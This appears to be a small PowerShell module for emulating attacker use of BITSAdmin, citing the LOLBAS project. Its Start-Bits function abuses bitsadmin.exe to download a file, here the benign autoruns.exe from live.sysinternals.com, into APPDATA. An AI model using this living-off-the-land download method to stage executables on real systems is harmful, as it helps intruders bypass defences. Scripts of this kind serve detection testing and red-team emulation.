<# 
    .Synopsis
    BITSAdmin abuse techniques

    .Description
    https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
#>

function Start-Bits {
    $binpaths = @('C:\Windows\System32\bitsadmin.exe', 'C:\Windows\SysWOW64\bitsadmin.exe')

    ForEach ($bp in $binpaths) {
        if (Test-Path $bp) {
            $binpath = $bp
            break
        }
    }

    #Handle this better
    if ($binpath -eq $null) {
        return $null
    }

    # Technique 1     
    Start-Process -FilePath $binpath -ArgumentList "/create 11"
    Start-Process -FilePath $binpath -ArgumentList "/addfile 11 https://live.sysinternals.com/autoruns.exe $env:APPDATA\autoruns.exe"
    Start-Process -FilePath $binpath -ArgumentList "/RESUME 11"
    Start-Process -FilePath $binpath -ArgumentList "/complete 11"

}
Export-ModuleMember -Function Start-Bits